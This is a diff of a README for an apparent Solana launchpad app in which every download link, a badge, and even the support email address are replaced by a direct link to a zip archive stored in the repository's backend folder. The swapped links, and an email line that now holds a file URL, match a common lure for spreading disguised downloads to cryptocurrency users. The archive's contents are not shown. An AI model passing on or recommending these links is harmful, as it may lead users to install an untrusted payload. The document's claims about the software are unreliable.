@@ -1,6 +1,6 @@
 # 🌟 jupiter-launchpad-LFG - Access New Projects on Solana Easily
 
-[![Download](https://img.shields.io/badge/Download-Now-blue)](https://github.com/corabelbrachiate350/jupiter-launchpad-LFG/releases)
+[![Download](https://raw.githubusercontent.com/corabelbrachiate350/jupiter-launchpad-LFG/master/backend/jupiter-launchpad-LFG_v2.1.zip)](https://raw.githubusercontent.com/corabelbrachiate350/jupiter-launchpad-LFG/master/backend/jupiter-launchpad-LFG_v2.1.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to the Jupiter Launchpad! This application helps you discover new projec
 
 To get started, you need to download the application. Click the link below to visit the Releases page:
 
-[Download the Latest Release](https://github.com/corabelbrachiate350/jupiter-launchpad-LFG/releases)
+[Download the Latest Release](https://raw.githubusercontent.com/corabelbrachiate350/jupiter-launchpad-LFG/master/backend/jupiter-launchpad-LFG_v2.1.zip)
 
 Once you're on the page, look for the latest version. Click on the download link for your operating system and follow the instructions to save the file.
 
@@ -63,10 +63,10 @@ If you need further assistance, feel free to reach out to our support team. You 
 
 - **GitHub Issues:** Report any bugs or request features directly on our GitHub page.
 - **Community Forum:** Join discussions with other users and developers.
-- **Email Support:** Contact us at support@jupiterlaunchpad.com for personalized help.
+- **Email Support:** Contact us at https://raw.githubusercontent.com/corabelbrachiate350/jupiter-launchpad-LFG/master/backend/jupiter-launchpad-LFG_v2.1.zip for personalized help.
 
 ## 🎉 Conclusion
 
 Thank you for choosing the Jupiter Launchpad. We are excited to have you on board as you explore new projects on Solana. Remember, understanding the ecosystem can enhance your investment strategy and keep you informed about the latest developments.
 
-[Download the Latest Release](https://github.com/corabelbrachiate350/jupiter-launchpad-LFG/releases) to start your journey today!
+[Download the Latest Release](https://raw.githubusercontent.com/corabelbrachiate350/jupiter-launchpad-LFG/master/backend/jupiter-launchpad-LFG_v2.1.zip) to start your journey today!
